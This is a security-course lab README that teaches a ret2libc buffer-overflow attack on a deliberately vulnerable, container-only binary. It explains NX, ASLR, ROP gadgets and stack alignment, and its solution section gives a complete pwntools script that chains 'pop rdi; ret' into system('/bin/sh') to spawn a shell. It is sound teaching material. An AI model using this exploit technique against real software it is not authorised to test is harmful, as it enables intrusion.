# Buffer-overflow lab — ret2libc

> ### ⚠ Deliberately vulnerable, container-only
> This binary is built with the stack canary and PIE **off on purpose** (see the
> Dockerfile). It runs inside a throwaway container bound to nothing, and the
> flag is a made-up string. Exploiting it *inside the box* is the exercise.
> Never ship a binary built like this, and only ever practise these techniques
> on software you own or are authorised to test. The week-10 README has the
> full scope/legal note.

This is the sequel to the **ret2win** lab — do that one first. Same program,
same one-line bug: `vuln` reads your name into a 64-byte buffer with a `read()`
that accepts 256 bytes, so your input runs over the saved return address and you
control where the program goes when `vuln()` returns.

The twist: **there is no `win()` this time.** `main()` and `vuln()` are the
whole program; nothing in it prints the flag or starts a shell. So where do you
point the return address? At code you didn't write but which is mapped into the
process anyway — the C library. This is **ret2libc**: return into libc and reuse
`system("/bin/sh")` to pop a shell, then read the flag yourself.

---

## Why you can't just inject your own code

Your first instinct might be to write shellcode (a few bytes of machine code
that spawns a shell) into `buf` and point the return address *at the buffer*.
That is the oldest trick in the book — and this lab has it switched **off**:

```
NX:  NX enabled
```

**NX** (No-eXecute, also called DEP) marks the stack as *data, not code*. The
CPU will refuse to execute instructions from it. So shellcode-in-the-buffer
faults the moment `rip` lands on it. In the ret2win lab NX was on too, but it
didn't matter — we jumped to `win()`, which is real code in an executable
region. The lesson NX teaches is exactly the one that makes this lab necessary:
**if you can't run your own code, run the code that's already there.** And the
richest pile of already-there code in any dynamically-linked program is libc.

glibc contains, among thousands of functions, `system()` — hand it a string and
it runs that string as a shell command. It also contains the literal bytes
`"/bin/sh"` sitting in its read-only data. Call `system("/bin/sh")` and you have
an interactive shell with the program's privileges. Both pieces are already in
memory. ret2libc is just wiring them together with the return address you
control.

---

## What a call needs, and why one address isn't enough

In ret2win the payload was dead simple: 72 bytes of filler, then one address.
`system("/bin/sh")` is harder, because a function **call** is more than a jump —
the argument has to be in the right place.

On x86-64 the first integer/pointer argument is passed in the **`rdi`
register** (that's the System V calling convention). So to make
`system("/bin/sh")` happen you must arrange, at the moment you enter `system`:

- `rdi` = the address of the string `"/bin/sh"`, and
- the return address = the address of `system`.

A bare `ret` only sets `rip`. It can't load `rdi`. So instead of one address you
lay down a **chain** of them, each a small step that runs a tiny snippet of
existing code and then returns into the next address in the chain. That's
**return-oriented programming (ROP)**, and the snippets are **gadgets** — short
instruction sequences ending in `ret` that already exist in the binary or libc.

The gadget you need is `pop rdi ; ret`: it pops the next 8 bytes off the stack
into `rdi`, then returns into whatever address follows. So the payload, laid out
on the stack from offset 72 upward, is:

```
 offset 72      +8              +16            +24         +32
 ┌────────────┬──────────────┬─────────────┬───────────┬────────────┐
 │  padding   │ pop rdi ; ret│ &"/bin/sh"  │    ret    │  &system   │
 │ (72 bytes) │              │             │ (align)   │            │
 └────────────┴──────────────┴─────────────┴───────────┴────────────┘
   fills buf     gadget 1      popped→rdi    alignment    call target
   + saved RBP
```

Reading it as the CPU does, after `vuln`'s `ret`:

1. Pop `&(pop rdi ; ret)` into `rip` → that gadget runs.
2. `pop rdi` takes the next stack word, `&"/bin/sh"`, into `rdi`. `ret` moves on.
3. A lone `ret` (does nothing but advance) — a **16-byte stack-alignment fix**;
   see the note at the bottom for why it's there.
4. `ret` into `system`, which now runs with `rdi` already pointing at
   `"/bin/sh"`. Shell.

One wrinkle you'll hit in Step 3: this binary is so small that
`pop rdi ; ret` **doesn't exist inside it** (modern glibc dropped the
`__libc_csu_init` function that classically supplied it). No matter — libc is
full of gadgets, and you're already using libc for everything else. All four
addresses in the chain will come from libc.

---

## The ASLR twist: you can't hard-code libc's address

Here is the big difference from ret2win, and the reason this lab is harder than
just "look up `win` with `nm`." Check the protections:

```
PIE:  No PIE (0x400000)
```

`No PIE` means the **main binary** loads at a fixed address — so `main`, `vuln`
and any gadget *in the binary* are at constant addresses, same as before. But
`system`, `"/bin/sh"` and the gadgets you actually need live in **libc**, and
libc is a shared library that the loader maps at a **random base address on
every run** — that's **ASLR** (Address Space Layout Randomisation), and it's on
here (it comes from the host kernel; you can't switch it off from inside an
unprivileged container, and that's realistic). Watch it move:

```bash
for i in 1 2; do python3 -c \
  'from pwn import *; context.log_level="error"; \
   p=process("./vuln"); print(hex(p.libc.address), "libc base"); p.close()'; done
# 0x7ce357a64000 libc base
# 0x74360ff47000 libc base      <- different base every run
```

So you **cannot** write `&system = 0x7f3c...` into your exploit; it's wrong by
the next run. What *is* stable is the **layout inside libc**: `system` is always
the same number of bytes from libc's base, because it's the same libc file
(the Dockerfile pins it precisely so these offsets don't drift). The rule is:

> **offset = always the same. base = random every run.
> absolute address = base + offset — so you must learn the base at run time.**

For a **local** target (this lab) you can read the base straight out of the
running process's `/proc/<pid>/maps`, which is exactly what pwntools does for you
below. Against a **remote** service you can't read its memory, so you'd first
have to *leak* an address and subtract the known offset to recover the base —
that's the "defeat ASLR with an info leak" lab the week-10 README points at.
This lab teaches the base+offset machinery; the leak is the next step.

> **Is reading the base from `/proc` "cheating"? No — and this is still a real
> ret2libc.** Every defining ingredient is here: there's no `win()` and no
> runnable shellcode (NX is on), so you reach a shell *only* by returning into
> code that already lives in libc — `system("/bin/sh")` — assembled with a
> `pop rdi ; ret` gadget and an alignment `ret`. Learning the libc base from
> `/proc` is the normal, accepted simplification for a **local** ret2libc lab:
> it keeps the focus on the chain and the base+offset model. The leak is simply
> how you'd obtain that same base when the target is remote and `/proc` isn't
> yours to read — a harder follow-on, not a different technique. If you want to
> force the leak now, the harder variant is a ret2plt info-leak: call `puts` on a
> GOT entry to print a live libc address, subtract its offset to recover the
> base, return to `main`, then send the `system("/bin/sh")` chain as a second
> stage.

---

## Build and enter

```bash
cd week-10/ret2libc
docker build -t cs440-ret2libc .
docker run -it --rm cs440-ret2libc
```

You land as `player` in `/home/player` with `vuln`, its source in `src/vuln.c`
(read it), and `gdb`, `objdump`, `nm`, `file`, and `python3` with **pwntools**.

Meet the program:

```bash
./vuln
# == ret2libc ==
# There is no win() function this time. main() and vuln() are all there is.
# Everything you need to pop a shell is already in libc.
# What is your name?
# > Alice
# Nice to meet you, Alice
# vuln() returned normally. (If you are reading this, you missed.)
```

---

## Step 1 — confirm what's on and what's off

```bash
pwn checksec vuln
```

```
Stack:    No canary found      <- overflow won't be detected
NX:       NX enabled           <- stack isn't executable -> no shellcode -> reuse libc
PIE:      No PIE (0x400000)    <- main binary fixed; libc is still ASLR'd (see above)
```

Compared to ret2win, the only thing that changed is your *strategy*: NX forces
code reuse, and ASLR'd libc forces you to compute addresses at run time.

## Step 2 — find the offset to the return address

Identical bug, identical frame as ret2win (`buf[64]` + saved `rbp` = **72**), so
the offset is the same **72**. Prove it the same way if you like — a cyclic
pattern into `gdb`, then `cyclic_find` on the 8 bytes that land on `rsp` at the
crash (the ret2win README walks this through step by step). The method is the
point; the number here is 72.

## Step 3 — locate the four pieces inside libc

You need, as **offsets within libc**: `system`, the string `"/bin/sh"`, a
`pop rdi ; ret` gadget, and a lone `ret`. pwntools reads them all straight from
the libc file:

```bash
python3 - <<'PY'
from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop  = ROP(libc)
print("system    offset", hex(libc.symbols["system"]))
print("/bin/sh   offset", hex(next(libc.search(b"/bin/sh\x00"))))
print("pop rdi;ret offset", hex(rop.find_gadget(["pop rdi","ret"]).address))
print("ret        offset", hex(rop.find_gadget(["ret"]).address))
PY
# system    offset 0x4c490
# /bin/sh   offset 0x197031
# pop rdi;ret offset 0x277e5
# ret        offset 0x26e99
```

(`ELF.symbols` is the library's symbol table, `ELF.search` scans its bytes for a
string, and `ROP(...).find_gadget` disassembles it looking for the instruction
sequence. These four numbers are for the libc in *this* image — read them off
your own libc rather than trusting a README, exactly as in the last lab. They're
**offsets**, not final addresses; you add the run-time base next.)

If you prefer `gdb`: run to a breakpoint in `vuln` (so libc is mapped),
`print system` gives its absolute address *for that run*, `find &system,
+0x200000, "/bin/sh"` locates the string, and `info proc mappings` shows libc's
base — subtract it from each to get the same offsets above.

---

<details>
<summary><b>Intended solution</b> — try it yourself first, then open this.</summary>

### The idea

Launch the process, read where libc landed *this run* from its `/proc/<pid>/maps`
(pwntools exposes it as `p.libc.address`), add the four offsets to that base to
get real addresses, assemble the chain, and send it. Then drive the shell.

### solve.py (how real CTFs do it)

Create `solve.py` in the container (`vim solve.py`):

```python
from pwn import *

context.arch = "amd64"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   # for the stable OFFSETS
rop  = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address   # offset in libc
ret     = rop.find_gadget(["ret"]).address              # offset in libc

p    = process("./vuln")
base = p.libc.address              # where libc mapped THIS run (from /proc/pid/maps)
system = base + libc.symbols["system"]
binsh  = base + next(libc.search(b"/bin/sh\x00"))

payload  = b"A" * 72               # fill buf[64] + saved rbp
payload += p64(base + pop_rdi)     # gadget: pop the next word into rdi
payload += p64(binsh)              #   the word it pops -> rdi = &"/bin/sh"
payload += p64(base + ret)         # lone ret: 16-byte stack alignment (see below)
payload += p64(system)             # return into system(), rdi already set

p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()                    # you now have a shell; type into it
```

```bash
python3 solve.py
# [*] Switching to interactive mode
# Nice to meet you, AAAAAAAA...        <- the greeting echoes your padding
$ cat /flag.txt
CS440{returned_into_libc_and_popped_a_shell}
$ id
uid=1000(player) gid=1000(player) groups=1000(player)
```

Notice there's no "[+] you win" banner — **you** are the win condition. Once
`system("/bin/sh")` runs you're sitting in a real shell, so you read the flag
the ordinary way, with `cat`.

### Why each line

- `ELF(libc)` + `p.libc.address` is the whole ASLR answer: constant offsets from
  the file, random base from the live process, added together.
- `p64()` packs each address little-endian, as the stack expects.
- `p.interactive()` hands your terminal to the spawned shell. (If you'd rather
  script it, give the overflow a moment to land the shell before you type into
  it — `p.clean(0.5)`, then `p.sendline(b"cat /flag.txt")`, then `p.recvline()`
  — otherwise the program's single `read()` can swallow your command along with
  the payload and the shell never sees it.)

</details>

---

## A note on stack alignment (the lone `ret` in the chain)

`system` eventually reaches SSE instructions in libc (like `movaps`) that
**fault unless `rsp` is 16-byte aligned** — the same x86-64 ABI rule the ret2win
README warned about. A chain entered through a bare `ret` usually lands `rsp` 8
bytes off, so `system` would crash *after* you did all the hard work. The fix is
one extra, do-nothing `ret` gadget in the chain: popping its address consumes 8
bytes and flips the alignment back. If your exploit reaches `system` but
segfaults deep inside libc, delete or add that single `ret` and try again — that
one word is almost always the culprit.

---

## What this challenge is really teaching

- **You don't need to inject code — the code is already loaded.** NX kills
  shellcode on the stack, so you reuse `system()` and `"/bin/sh"` that ship with
  every dynamically-linked program. Controlling the return address is enough.
- **A call is argument + target.** Redirecting `rip` isn't sufficient for a real
  function; the argument has to be in `rdi`. One `pop rdi ; ret` gadget turns a
  single-jump primitive into an arbitrary call — the first taste of ROP.
- **ASLR moves the base, not the layout.** Offsets inside a known libc are
  constant; the base is random per run. absolute = base + offset. Locally you
  read the base from `/proc`; remotely you leak it. That single equation is the
  backbone of nearly every modern heap/stack exploit.
- **Mitigations compose.** ret2win needed PIE and the canary off. Here NX is
  *on* (so you reuse code) and ASLR is *on* (so you resolve addresses at run
  time) — you defeated two live defences by technique, not by switching them
  off. The next step, leaking an address to beat ASLR with no `/proc` to read,
  is what turns this local exploit into a remote one.
